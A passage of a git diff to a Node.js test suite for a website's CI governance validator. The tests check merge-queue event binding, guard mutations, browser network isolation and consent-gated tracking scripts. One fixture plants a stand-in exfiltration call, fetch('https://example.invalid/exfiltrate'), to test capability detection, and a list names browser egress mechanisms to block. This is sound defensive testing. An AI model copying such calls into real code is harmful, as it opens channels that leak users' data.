@@ -1,24 +1,99 @@
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
+import { createHash } from "node:crypto";
+import { readFileSync } from "node:fs";
 import { access, mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
+import { pathToFileURL } from "node:url";
 import test from "node:test";
+import vm from "node:vm";
 
 import {
   CANONICAL_AUTHORITY_PATHS,
   runBaseOnlyGitSimulation,
   runBaseOnlySimulation,
+  validateOperationalReport,
   verifyMaterializedAuthoritySnapshot,
 } from "../../scripts/governance/validate-f2-gov-08.mjs";
 import * as portableGuard from "../../scripts/governance/validate-f2-gov-08.mjs";
+import * as trustedServer from "../../scripts/governance/f2-gov-08-static-server.mjs";
+import * as trustedConsumer from "../../scripts/governance/f2-gov-08-consumer.mjs";
 
 const root = new URL("../../", import.meta.url);
 const sourceRepository = decodeURIComponent(root.pathname).replace(/^\/(.:)/, "$1").replace(/\/$/, "");
 const canonicalPaths = Object.values(CANONICAL_AUTHORITY_PATHS);
-const canonicalBlob = (path) => execFileSync("git", ["cat-file", "blob", `HEAD:${path}`], { cwd: sourceRepository, encoding: null, stdio: ["ignore", "pipe", "pipe"] });
+const canonicalAuthoritySha = execFileSync("git", ["rev-parse", "HEAD"], { cwd: sourceRepository, encoding: "utf8" }).trim();
+const canonicalBlob = (path) => execFileSync("git", ["cat-file", "blob", `${canonicalAuthoritySha}:${path}`], { cwd: sourceRepository, encoding: null });
+const workingFile = (path) => readFileSync(join(sourceRepository, ...path.split("/")));
 const publishedPaths = JSON.parse(canonicalBlob("deploy/publish-manifest.json").toString("utf8")).files;
 const html = (title, width = 44, height = 44) => `<!doctype html><html data-drawer-capable="true" data-focus-capable="true" data-target-width="${width}" data-target-height="${height}" data-focus-target-width="48" data-focus-target-height="48"><title>${title}</title></html>`;
+
+function assertCanonicalPlaywrightCacheBinding(consumer, runtime) {
+  assert.equal(runtime.container.browsersPath, "/ms-playwright", "canonical Playwright browser cache path is absent or divergent");
+  assert.match(consumer, /process\.env\.PLAYWRIGHT_BROWSERS_PATH\s*=\s*runtime\.container\.browsersPath[\s\S]*?require\("playwright"\)/, "trusted browser cache is not bound before Playwright loads");
+  assert.doesNotMatch(consumer, /PLAYWRIGHT_BROWSERS_PATH\s*\|\||PLAYWRIGHT_BROWSERS_PATH\s*\?\?/, "trusted browser cache uses a fallback");
+}
+
+function assertHostOnlyObservationAuthority(consumer) {
+  assert.doesNotMatch(consumer, /exposeBinding\(/, "candidate page must not receive an observation binding");
+  assert.doesNotMatch(consumer, /__branctReportExternalAttempt/, "candidate page must not observe the authority channel");
+  assert.doesNotMatch(consumer, /reportToken|trusted\.reportToken|randomBytes/, "candidate page must not receive an observation secret");
+  assert.match(consumer, /context\.route\("\*\*"/, "trusted host-side request interception is required");
+  assert.match(consumer, /context\.routeWebSocket\("\*\*"/, "trusted host-side socket interception is required");
+}
+
+function assertCanonicalConsentProbe(consumer) {
+  assert.match(consumer, /consent-loader"\) return \{ mechanism: "script", url: "https:\/\/connect\.facebook\.net\/en_US\/fbevents\.js", route: "crm-gestao\.html" \}/);
+  assert.match(consumer, /action === "consent-loader"[\s\S]*?route: "crm-gestao\.html"[\s\S]*?goto\(`\$\{origin\}\/crm-gestao\.html`/);
+  for (const phase of ["no consent decision", "explicit consent refusal", "consent withdrawal", "consent withdrawal after valid consent"]) assert.match(consumer, new RegExp(phase));
+}
+
+const crmPixelScripts = (crmSource = canonicalBlob("crm-gestao.html").toString("utf8")) => [...crmSource.matchAll(/<script(?:\s[^>]*)?>([\s\S]*?)<\/script>/gi)]
+  .map((match) => match[1])
+  .filter((source) => source.includes("__BRANCT_PIXEL_ID") || source.includes("CONSENT_KEY"));
+
+function runCrmConsentPage(storage = new Map(), action = null, crmSource = undefined) {
+  const attempts = [];
+  const listeners = new Map();
+  const element = (id) => ({
+    hidden: true,
+    classList: { add() {}, remove() {} },
+    addEventListener(type, listener) { listeners.set(`${id}:${type}`, listener); },
+  });
+  const elements = new Map([
+    ["consent-banner", element("consent-banner")],
+    ["consent-accept", element("consent-accept")],
+    ["consent-reject", element("consent-reject")],
+  ]);
+  const document = {
+    createElement: () => ({ async: false, src: "" }),
+    getElementsByTagName: () => [{ parentNode: { insertBefore(node) { attempts.push({ mechanism: "script", url: node.src }); } } }],
+    getElementById: (id) => elements.get(id) ?? null,
+    querySelectorAll: () => [],
+  };
+  const sandbox = {
+    document,
+    localStorage: {
+      getItem: (key) => storage.get(key) ?? null,
+      setItem: (key, value) => storage.set(key, String(value)),
+      removeItem: (key) => storage.delete(key),
+    },
+    requestAnimationFrame: (callback) => callback(),
+    setTimeout: (callback) => callback(),
+    matchMedia: () => ({ matches: false }),
+    console,
+  };
+  sandbox.window = sandbox;
+  const context = vm.createContext(sandbox);
+  for (const source of crmPixelScripts(crmSource)) vm.runInContext(source, context, { filename: "crm-gestao.html" });
+  if (action) {
+    const listener = listeners.get(`${action}:click`);
+    assert.equal(typeof listener, "function", `consent action is absent: ${action}`);
+    listener();
+  }
+  return { attempts, storage };
+}
 
 async function write(repository, path, bytes) {
   const target = join(repository, ...path.split("/"));
@@ -54,13 +129,13 @@ async function publishBinaryRootEntries(fixture, entries, message) {
   await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
 }
 
-async function createRepository() {
+async function createRepository(authorityBlob = canonicalBlob) {
   const repository = await mkdtemp(join(tmpdir(), "branct-f2-gov-08-f1-"));
   const git = (...args) => execFileSync("git", args, { cwd: repository, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim();
   git("init", "--quiet", "--initial-branch=main");
   git("config", "user.email", "f2-gov-08@example.invalid");
   git("config", "user.name", "F2-GOV-08 fixture");
-  for (const path of canonicalPaths) await write(repository, path, canonicalBlob(path));
+  for (const path of canonicalPaths) await write(repository, path, authorityBlob(path));
   await write(repository, "index.html", html("base"));
   await write(repository, "politica-privacidade.html", html("privacy"));
   await write(repository, "src/css/branct.css", ".menu{display:block}\n");
@@ -109,6 +184,102 @@ function currentGitTreeEntries() {
     const pathBytes = record.subarray(tab + 1);
     return { mode, type, oid, path: pathBytes.toString("ascii"), pathBytes };
   });
+}
+
+const canonicalJsonForTest = (value) => {
+  if (Array.isArray(value)) return `[${value.map(canonicalJsonForTest).join(",")}]`;
+  if (value && typeof value === "object") return `{${Object.keys(value).sort().map((key) => `${JSON.stringify(key)}:${canonicalJsonForTest(value[key])}`).join(",")}}`;
+  return JSON.stringify(value);
+};
+const sha256ForTest = (value) => createHash("sha256").update(value).digest("hex");
+const networkControlActionsForTest = [
+  "fetch", "fetch-computed", "XMLHttpRequest", "WebSocket", "EventSource", "sendBeacon",
+  "serviceWorker.register", "script", "dynamic-import", "frame", "image", "window.open",
+  "location.assign", "location.replace", "location.href", "resource-hint-preconnect",
+  "resource-hint-dns-prefetch", "consent-loader", "form-submit",
+];
+const resourceHintActionsForTest = new Set(["resource-hint-preconnect", "resource-hint-dns-prefetch"]);
+const expectedControlStatusForTest = (action) => resourceHintActionsForTest.has(action)
+  ? "DETECTED_AND_REJECTED_EGRESS_NOT_PROVEN"
+  : "BLOCKED_AND_RECORDED";
+const expectedControlDispositionForTest = (action) => resourceHintActionsForTest.has(action)
+  ? "DETECTED_AFTER_DOM_INSERTION"
+  : "BLOCKED_BEFORE_EGRESS";
+const expectedControlObservationForTest = (action) => {
+  const target = action === "WebSocket" ? "wss://f2-gov-09.invalid/socket" : `https://f2-gov-09.invalid/${encodeURIComponent(action)}`;
+  if (action === "fetch-computed") return { mechanism: "fetch", url: "https://f2-gov-09.invalid/computed", route: "about:blank" };
+  if (action === "dynamic-import") return { mechanism: "script", url: target, route: "about:blank" };
+  if (["location.assign", "location.replace", "location.href"].includes(action)) return { mechanism: "navigation", url: target, route: "about:blank" };
+  if (["resource-hint-preconnect", "resource-hint-dns-prefetch"].includes(action)) return { mechanism: "resource-hint", url: target, route: "about:blank" };
+  if (action === "consent-loader") return { mechanism: "script", url: "https://connect.facebook.net/en_US/fbevents.js", route: "crm-gestao.html" };
+  if (action === "form-submit") return { mechanism: "fetch", url: "https://n8n.branct.com/webhook/site-lead", route: "contactos.html" };
+  return { mechanism: action, url: target, route: action === "serviceWorker.register" ? "src/i18n/pt.json" : "about:blank" };
+};
+
+function canonicalOperationalFixture() {
+  const matrixBytes = canonicalBlob(CANONICAL_AUTHORITY_PATHS.matrix);
+  const expectationsBytes = canonicalBlob(CANONICAL_AUTHORITY_PATHS.expectations);
+  const menuBytes = canonicalBlob(CANONICAL_AUTHORITY_PATHS.menuEvidence);
+  const matrix = JSON.parse(matrixBytes.toString("utf8"));
+  const menu = JSON.parse(menuBytes.toString("utf8"));
+  const matrixDigest = sha256ForTest(matrixBytes);
+  const baseSha = "1".repeat(40);
+  const headSha = "2".repeat(40);
+  const payloadDigest = "3".repeat(64);
+  const authority = { files: new Map([
+    ["matrix", { bytes: matrixBytes, pin: { sha256: matrixDigest } }],
+    ["expectations", { bytes: expectationsBytes, pin: { sha256: sha256ForTest(expectationsBytes) } }],
+    ["menuEvidence", { bytes: menuBytes, pin: { sha256: sha256ForTest(menuBytes) } }],
+  ]) };
+  const evidence = [];
+  const reports = matrix.engines.map((engine, engineIndex) => {
+    const observations = [];
+    for (const route of matrix.routes) for (const [viewport] of Object.entries(matrix.viewports)) {
+      const rawObservation = { overflow: engineIndex === 0 && observations.length === 0, smallTargets: engineIndex === 0 && observations.length === 0 ? [{ width: 20, height: 20 }] : [] };
+      observations.push(rawObservation);
+      const binding = { baseSha, headSha, matrixDigest, payloadDigest, engine, kind: "observation", route, viewport, action: "measure-responsive" };
+      const identity = sha256ForTest(canonicalJsonForTest(binding));
+      const semanticResult = rawObservation.overflow || rawObservation.smallTargets.length ? "FAIL" : "PASS";
+      evidence.push({ ...binding, identity, rawObservation, semanticResult, digest: sha256ForTest(canonicalJsonForTest({ ...binding, identity, rawObservation, semanticResult })) });
+    }
+    const menuResults = menu.entries.map((entry, index) => {
+      const measuredResult = index === 0 && engineIndex === 0
+        ? { focusReached: false }
+        : { focusReached: true, focusStyle: true, open: { expanded: "true", drawerInside: true, focusInside: true, bodyLocked: true, backgroundInert: true, closeTarget: { width: 44, height: 44 } }, closed: { closed: true, focusReturned: true }, closeButtonClosed: null, outsideClosed: null };
+      const semanticResult = index === 0 && engineIndex === 0 ? "FAIL" : "PASS";
+      const action = entry.actionPhases.join("+");
+      const binding = { baseSha, headSha, matrixDigest, payloadDigest, engine, kind: "menu", route: entry.route, viewport: entry.viewport, action };
+      const identity = sha256ForTest(canonicalJsonForTest(binding));
+      const rawObservation = { measuredResult };
+      evidence.push({ ...binding, identity, rawObservation, semanticResult, digest: sha256ForTest(canonicalJsonForTest({ ...binding, identity, rawObservation, semanticResult })) });
+      return { semanticResult };
+    });
+    return {
+      engine,
+      version: "test-engine",
+      observations,
+      menuResults,
+      actions: Array.from({ length: matrix.actionCountPerEngine }, (_, index) => ({ id: index, status: "COMPLETED" })),
+      reducedMotion: { matches: true, maxDurationMs: 0 },
+      networkIsolation: {
+        policy: "LOCAL_VERIFIED_BLOBS_AND_RUNTIME_EXTERNAL_FAIL",
+        cleanContext: { cookies: 0, storageOrigins: 0, serviceWorkers: 0 },
+        localRequestCount: 1,
+        localI18nSuccessCount: 1,
+        localViolations: [],
+        flowAttempts: [],
+        controls: networkControlActionsForTest.map((action) => {
+          const probeId = sha256ForTest(canonicalJsonForTest({ baseSha, headSha, payloadDigest, engine, action }));
+          const expected = expectedControlObservationForTest(action);
+          return { action, status: expectedControlStatusForTest(action), probeId, observed: [{ ...expected, origin: new URL(expected.url).origin, phase: "control-probe", engine, action, viewport: "control", disposition: expectedControlDispositionForTest(action), probeId }] };
+        }),
+      },
+      consoleIssues: [],
+      summary: { overflowCount: engineIndex === 0 ? 1 : 0, smallTargetObservationCount: engineIndex === 0 ? 1 : 0, menuFailureCount: engineIndex === 0 ? 1 : 0, reducedMotionDurationMs: 0, consoleIssueCount: 0 },
+      evidence: [],
+    };
+  });
+  return { authority, baseSha, headSha, payloadDigest, report: { complete: true, executionMode: "OPERATIONAL", conclusion: "EXPECTED_SEMANTIC_RED", capabilityInventory: [], reports, evidence } };
 }
 
 async function publishFixtureHead(fixture, message) {
@@ -184,7 +355,11 @@ test("F2-GOV-08 rejects alternate imports in the consumer authority", async () =
   const source = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
   const localImports = [...source.matchAll(/from\s+["'](\.\/[^"']+)["']/g)].map((match) => match[1]);
   assert.deepEqual(localImports, ["./f2-gov-08-static-server.mjs"]);
-  assert.doesNotMatch(source, /import\s*\(|require\s*\(/);
+  const dynamicImports = [...source.matchAll(/\bimport\s*\(([^)]+)\)/g)].map((match) => match[1].trim());
+  assert.deepEqual(dynamicImports, ["target"], "trusted consumer may use dynamic import only for the isolated runtime network control");
+  assert.match(source, /else if \(control === "dynamic-import"\) await import\(target\);/);
+  assert.match(source, /const require = createRequire\(join\(modules, "\.\.", "package\.json"\)\);\s*const playwright = require\("playwright"\);/);
+  assert.equal((source.match(/\brequire\(/g) ?? []).length, 1, "trusted consumer may require only the pinned Playwright package");
 });
 
 test("F2-GOV-08 rejects event base, head, repository and ref transplantation", async (t) => {
@@ -204,6 +379,146 @@ test("F2-GOV-08 rejects event base, head, repository and ref transplantation", a
       assert.throws(() => run(fixture), expected);
     });
   } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-09-F18-A accepts an exact merge_group checks_requested event", async () => {
+  const fixture = await createRepository(workingFile);
+  try {
+    const queueRef = `gh-readonly-queue/main/pr-63-${fixture.baseSha}`;
+    fixture.git("update-ref", `refs/remotes/origin/${queueRef}`, fixture.headSha);
+    fixture.event = {
+      action: "checks_requested",
+      merge_group: {
+        base_sha: fixture.baseSha,
+        head_sha: fixture.headSha,
+        base_ref: "refs/heads/main",
+        head_ref: `refs/heads/${queueRef}`,
+      },
+      repository: { full_name: "branctstudio-rgb/sitebranct" },
+    };
+    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
+    assert.equal(run(fixture).decision, "PASS");
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-09-F18-A rejects incomplete or incompatible merge_group events", async (t) => {
+  const fixture = await createRepository(workingFile);
+  try {
+    const queueRef = `gh-readonly-queue/main/pr-63-${fixture.baseSha}`;
+    fixture.git("update-ref", `refs/remotes/origin/${queueRef}`, fixture.headSha);
+    const valid = {
+      action: "checks_requested",
+      merge_group: {
+        base_sha: fixture.baseSha,
+        head_sha: fixture.headSha,
+        base_ref: "refs/heads/main",
+        head_ref: `refs/heads/${queueRef}`,
+      },
+      repository: { full_name: "branctstudio-rgb/sitebranct" },
+    };
+    const cases = [
+      ["missing base SHA", (event) => { delete event.merge_group.base_sha; }, /merge group base SHA is malformed/i],
+      ["missing head SHA", (event) => { delete event.merge_group.head_sha; }, /merge group head SHA is malformed/i],
+      ["missing base ref", (event) => { delete event.merge_group.base_ref; }, /merge group base ref is absent or malformed/i],
+      ["missing head ref", (event) => { delete event.merge_group.head_ref; }, /merge group head ref is absent or malformed/i],
+      ["wrong action", (event) => { event.action = "destroyed"; }, /merge group action is divergent/i],
+      ["incompatible base ref", (event) => { event.merge_group.base_ref = "refs/heads/release"; }, /base ref is divergent/i],
+      ["both event bodies", (event) => { event.pull_request = { base: { ref: "main", sha: fixture.baseSha }, head: { ref: "candidate", sha: fixture.headSha } }; }, /event body is ambiguous/i],
+    ];
+    for (const [label, mutate, expected] of cases) await t.test(label, async () => {
+      const event = structuredClone(valid);
+      mutate(event);
+      await writeFile(fixture.eventPath, JSON.stringify(event));
+      assert.throws(() => run(fixture), expected);
+    });
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-09-F18-A binds a stacked merge_group to its exact first parent", async () => {
+  const fixture = await createRepository(workingFile);
+  try {
+    const queueBase = fixture.headSha;
+    await write(fixture.repository, "politica-privacidade.html", html("queued candidate"));
+    fixture.git("add", "politica-privacidade.html");
+    fixture.git("commit", "--quiet", "-m", "synthetic stacked merge group");
+    fixture.headSha = fixture.git("rev-parse", "HEAD");
+    const queueRef = `gh-readonly-queue/main/pr-64-${queueBase}`;
+    fixture.git("update-ref", `refs/remotes/origin/${queueRef}`, fixture.headSha);
+    fixture.event = {
+      action: "checks_requested",
+      merge_group: {
+        base_sha: queueBase,
+        head_sha: fixture.headSha,
+        base_ref: "refs/heads/main",
+        head_ref: `refs/heads/${queueRef}`,
+      },
+      repository: { full_name: "branctstudio-rgb/sitebranct" },
+    };
+    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
+    assert.equal(run(fixture).decision, "PASS");
+    fixture.event.merge_group.base_sha = fixture.baseSha;
+    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
+    assert.throws(() => run(fixture), /base is not the exact first parent/i);
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-09-F18-A mutation controls keep merge_group action and parent binding load-bearing", async () => {
+  const source = workingFile("scripts/governance/validate-f2-gov-08.mjs").toString("utf8");
+  const loadMutation = async (label, pattern, replacement) => {
+    const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-merge-group-mutation-"));
+    const mutated = source.replace(pattern, replacement);
+    assert.notEqual(mutated, source, `${label} mutation was a no-op`);
+    const target = join(directory, "validate-f2-gov-08.mjs");
+    await writeFile(target, mutated);
+    return { directory, module: await import(`${pathToFileURL(target).href}?mutation=${Date.now()}-${encodeURIComponent(label)}`) };
+  };
+
+  const actionFixture = await createRepository(workingFile);
+  let actionMutation;
+  try {
+    const queueRef = `gh-readonly-queue/main/pr-65-${actionFixture.baseSha}`;
+    actionFixture.git("update-ref", `refs/remotes/origin/${queueRef}`, actionFixture.headSha);
+    actionFixture.event = {
+      action: "destroyed",
+      merge_group: { base_sha: actionFixture.baseSha, head_sha: actionFixture.headSha, base_ref: "refs/heads/main", head_ref: `refs/heads/${queueRef}` },
+      repository: { full_name: "branctstudio-rgb/sitebranct" },
+    };
+    await writeFile(actionFixture.eventPath, JSON.stringify(actionFixture.event));
+    actionMutation = await loadMutation("remove action guard", '    assert.equal(event.action, "checks_requested", "trusted merge group action is divergent");', "");
+    assert.doesNotThrow(
+      () => actionMutation.module.runBaseOnlyGitSimulation({ repository: actionFixture.repository, eventPath: actionFixture.eventPath }),
+      "removing the action guard must demonstrably admit an incompatible event",
+    );
+  } finally {
+    if (actionMutation) await rm(actionMutation.directory, { recursive: true, force: true });
+    await rm(actionFixture.repository, { recursive: true, force: true });
+  }
+
+  const parentFixture = await createRepository(workingFile);
+  let parentMutation;
+  try {
+    const queueBase = parentFixture.headSha;
+    await write(parentFixture.repository, "politica-privacidade.html", html("mutated parent binding"));
+    parentFixture.git("add", "politica-privacidade.html");
+    parentFixture.git("commit", "--quiet", "-m", "synthetic parent mutation");
+    parentFixture.headSha = parentFixture.git("rev-parse", "HEAD");
+    const queueRef = `gh-readonly-queue/main/pr-66-${queueBase}`;
+    parentFixture.git("update-ref", `refs/remotes/origin/${queueRef}`, parentFixture.headSha);
+    parentFixture.event = {
+      action: "checks_requested",
+      merge_group: { base_sha: parentFixture.baseSha, head_sha: parentFixture.headSha, base_ref: "refs/heads/main", head_ref: `refs/heads/${queueRef}` },
+      repository: { full_name: "branctstudio-rgb/sitebranct" },
+    };
+    await writeFile(parentFixture.eventPath, JSON.stringify(parentFixture.event));
+    parentMutation = await loadMutation("remove first-parent guard", '    assert.equal(firstParent, baseSha, "trusted merge group base is not the exact first parent of its head");', "");
+    assert.doesNotThrow(
+      () => parentMutation.module.runBaseOnlyGitSimulation({ repository: parentFixture.repository, eventPath: parentFixture.eventPath }),
+      "removing the first-parent guard must demonstrably admit a transplanted merge-group base",
+    );
+  } finally {
+    if (parentMutation) await rm(parentMutation.directory, { recursive: true, force: true });
+    await rm(parentFixture.repository, { recursive: true, force: true });
+  }
 });
 
 test("F2-GOV-08 rejects moved remote refs even when event SHAs remain unchanged", async (t) => {
@@ -416,11 +731,11 @@ test("F2-GOV-08 portable grammar accepts every one of the 56 current published p
   );
 });
 
-test("F2-GOV-08 portable trie accepts all 806 current regular Git paths and all 56 manifest paths", () => {
+test("F2-GOV-08 portable trie accepts all 808 current regular Git paths and all 56 manifest paths", () => {
   const current = currentGitTreeEntries();
-  assert.equal(current.length, 806);
+  assert.equal(current.length, 808);
   assert.ok(current.every(({ mode, type }) => mode === "100644" && type === "blob"));
-  assert.equal(portableGuard.validatePortableGitTreeEntries(current).entries.length, 806);
+  assert.equal(portableGuard.validatePortableGitTreeEntries(current).entries.length, 808);
   assert.equal(portableGuard.validatePortableGitTreeEntries(syntheticTreeEntries(publishedPaths)).entries.length, 56);
 });
 
@@ -542,8 +857,26 @@ for (const [label, mode, oidFactory] of [
   } finally { await rm(fixture.repository, { recursive: true, force: true }); }
 });
 
+test("F2-GOV-08 inventories an external capability without treating static presence as an observed attempt", async () => {
+  const fixture = await createRepository();
+  try {
+    await write(fixture.repository, "src/js/branct.js", "fetch('https://example.invalid/exfiltrate');\n");
+    fixture.git("add", "src/js/branct.js");
+    fixture.git("commit", "--quiet", "-m", "external capability inventory");
+    fixture.headSha = fixture.git("rev-parse", "HEAD");
+    fixture.git("update-ref", "refs/remotes/origin/candidate", fixture.headSha);
+    fixture.event.pull_request.head.sha = fixture.headSha;
+    await writeFile(fixture.eventPath, JSON.stringify(fixture.event));
+    const result = run(fixture);
+    assert.equal(result.decision, "PASS");
+    assert.ok(result.authority.capabilityInventory.some(({ path, category, mechanism, reference }) =>
+      path === "src/js/branct.js" && category === "ACTIVE_API" && mechanism === "fetch" && reference === null));
+    assert.ok(result.authority.capabilityInventory.some(({ path, category, mechanism, reference }) =>
+      path === "src/js/branct.js" && category === "EXTERNAL_LITERAL" && mechanism === "https-url" && reference === "https://example.invalid/exfiltrate"));
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
 for (const [label, path, content, expected] of [
-  ["external network attempt", "src/js/branct.js", "fetch('https://example.invalid/exfiltrate');\n", /external network intent/i],
   ["KEYED_PRODUCER_TRANSPLANT", "index.html", `${html("candidate").replace("<html ", "<html data-authority-key=\"producer\" ")}`, /KEYED_PRODUCER_TRANSPLANT/i],
 ]) test(`F2-GOV-08 rejects ${label} from candidate content`, async () => {
   const fixture = await createRepository();
@@ -559,10 +892,2196 @@ for (const [label, path, content, expected] of [
   } finally { await rm(fixture.repository, { recursive: true, force: true }); }
 });
 
-test("F2-GOV-08 records simulator limits instead of claiming workflow enforcement", () => {
+test("F2-GOV-09 promotes the base-only authority to operational enforcement", () => {
   const contract = JSON.parse(canonicalBlob(CANONICAL_AUTHORITY_PATHS.contract).toString("utf8"));
-  assert.equal(contract.limitations.workflowEnforcement, "NOT_VERIFIED");
-  assert.equal(contract.limitations.operationalIsolation, "NOT_VERIFIED");
-  assert.equal(contract.limitations.browserNetworkIsolation, "NOT_VERIFIED");
-  assert.equal(contract.status, "OFFLINE_SIMULATOR_ONLY");
+  const workflow = canonicalBlob(".github/workflows/universal-pr-gate.yml").toString("utf8");
+  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  assert.equal(contract.status, "OPERATIONAL_CANDIDATE");
+  assert.equal(contract.limitations.workflowEnforcement, "CANDIDATE_PENDING_PROTECTED_MERGE");
+  assert.equal(contract.limitations.operationalIsolation, "VERIFIED_IN_CI");
+  assert.equal(contract.limitations.browserNetworkIsolation, "VERIFIED_IN_CI");
+  assert.match(workflow, /Run base-only F2-GOV-08 enforcement/);
+  assert.match(workflow, /git cat-file blob "\$\{BASE_SHA\}:scripts\/governance\/validate-f2-gov-08\.mjs"/);
+  assert.match(consumer, /chromium/);
+  assert.match(consumer, /firefox/);
+  assert.match(consumer, /webkit/);
+  assert.match(consumer, /context\.route\(/);
+  assert.match(canonicalBlob(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8"), /127\.0\.0\.1/);
+});
+
+test("F2-GOV-09 canonical matrix fixes 84 observations, 41 identities and 184 actions per engine", () => {
+  const matrix = JSON.parse(canonicalBlob(CANONICAL_AUTHORITY_PATHS.matrix).toString("utf8"));
+  assert.deepEqual(matrix.engines, ["chromium", "firefox", "webkit"]);
+  assert.equal(matrix.observationCountPerEngine, 84);
+  assert.equal(matrix.menuEvidenceCountPerEngine, 41);
+  assert.equal(matrix.actionCountPerEngine, 184);
+  assert.deepEqual(matrix.viewports["1024x768"], [1024, 768]);
+});
+
+test("F2-GOV-09 browser network boundary blocks workers, sockets, RTC and external HTTP", () => {
+  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const server = canonicalBlob(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8");
+  assert.match(consumer, /newContext\(\{ serviceWorkers: "block" \}\)/);
+  assert.match(consumer, /context\.routeWebSocket\("\*\*"/);
+  assert.match(consumer, /Object\.defineProperty\(globalThis, "RTCPeerConnection"/);
+  assert.match(consumer, /installRuntimeNetworkPolicy/);
+  assert.match(consumer, /runNetworkControl/);
+  assert.match(consumer, /assertNoObservedExternalAttempts/);
+  assert.match(consumer, /NETWORK_CONTROL_ACTIONS/);
+  assert.match(server, /connect-src 'self'/);
+  assert.match(server, /worker-src 'none'/);
+  assert.match(server, /frame-src 'none'/);
+});
+
+test("F2-GOV-09 consumer uses the menu authority's fixed-order digest contract", () => {
+  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const menuAuthority = JSON.parse(canonicalBlob("fixtures/audit/f2-01-menu-evidence-matrix.json").toString("utf8"));
+  const payload = menuAuthority.entries.map(({ evidenceId, route, viewport, actionPhases, developmentSemanticStatus, developmentResult, developmentResultSha256 }) => ({ evidenceId, route, viewport, actionPhases, developmentSemanticStatus, developmentResult, developmentResultSha256 }));
+  assert.equal(createHash("sha256").update(JSON.stringify(payload)).digest("hex"), menuAuthority.sha256);
+  assert.match(consumer, /sha256\(JSON\.stringify\(menuEvidencePayload\)\)/);
+  assert.match(consumer, /page\.evaluate\(\(opened\) => \{/);
+  assert.match(consumer, /\}, openInvoked\)\);/);
+  assert.match(consumer, /phase === "after-open"/);
+});
+
+test("F2-GOV-09 operational validator accepts the exact complete semantic RED vector", () => {
+  const fixture = canonicalOperationalFixture();
+  assert.equal(validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest).length, 375);
+});
+
+for (const [label, mutate, expected] of [
+  ["missing browser engine", (report) => report.reports.splice(1, 1), /engine report set is missing/i],
+  ["partial evidence", (report) => report.evidence.pop(), /evidence report is partial/i],
+  ["inconclusive browser action", (report) => { report.reports[0].actions[0].status = "TIMEOUT"; }, /action evidence is inconclusive/i],
+  ["unblocked external network", (report) => { report.reports[0].networkIsolation.controls[0].status = "ALLOWED"; }, /control vector is incomplete|divergent/i],
+  ["unexercised browser route blocker", (report) => { report.reports[0].networkIsolation.controls[0].observed = []; }, /control observation cardinality/i],
+  ["producer-selected conclusion", (report) => { report.conclusion = "READY_GREEN"; }, /operational conclusion is divergent/i],
+]) test(`F2-GOV-09 operational validator rejects ${label}`, () => {
+  const fixture = canonicalOperationalFixture();
+  mutate(fixture.report);
+  assert.throws(() => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest), expected);
+});
+
+test("F2-GOV-09 rejects a candidate attempt transplanted into a trusted control probe", () => {
+  const fixture = canonicalOperationalFixture();
+  fixture.report.reports[0].networkIsolation.controls[0].observed.push({
+    mechanism: "fetch",
+    url: "https://candidate-delayed.invalid/late",
+    disposition: "BLOCKED_BEFORE_EGRESS",
+  });
+  assert.throws(
+    () => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest),
+    /control observation cardinality|probe identity|candidate attempt/i,
+  );
+});
+
+test("F2-GOV-09 rejects every local request violation even when i18n succeeds", () => {
+  const fixture = canonicalOperationalFixture();
+  fixture.report.reports[0].networkIsolation.localViolations = [{
+    url: "http://127.0.0.1:4173/not-allowlisted.json",
+    reason: "trusted static request is not an expected candidate blob",
+  }];
+  assert.throws(
+    () => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest),
+    /local request violation/i,
+  );
+});
+
+test("F2-GOV-09 runtime policy observes generic preconnect and dns-prefetch hints", () => {
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  assert.match(consumer, /preconnect/);
+  assert.match(consumer, /dns-prefetch/);
+  assert.match(consumer, /context\.route\("\*\*"/);
+  assert.doesNotMatch(consumer, /__branctReportExternalAttempt/);
+});
+
+test("F2-GOV-09-F10 keeps external preconnect detection distinct from proven pre-egress blocking", () => {
+  const probeId = "a".repeat(64);
+  const observed = [{
+    mechanism: "resource-hint",
+    url: "https://f2-gov-09.invalid/resource-hint-preconnect",
+    origin: "https://f2-gov-09.invalid",
+    phase: "control-probe",
+    engine: "chromium",
+    action: "resource-hint-preconnect",
+    route: "about:blank",
+    viewport: "control",
+    disposition: "DETECTED_AFTER_DOM_INSERTION",
+    probeId,
+  }];
+  assert.doesNotThrow(() => trustedConsumer.assertExpectedNetworkControl(observed, "chromium", "resource-hint-preconnect", probeId));
+  assert.throws(
+    () => trustedConsumer.assertExpectedNetworkControl([{ ...observed[0], disposition: "BLOCKED_BEFORE_EGRESS" }], "chromium", "resource-hint-preconnect", probeId),
+    /trusted control observation is divergent/i,
+  );
+  const controls = networkControlActionsForTest.map((action) => ({ action, status: expectedControlStatusForTest(action) }));
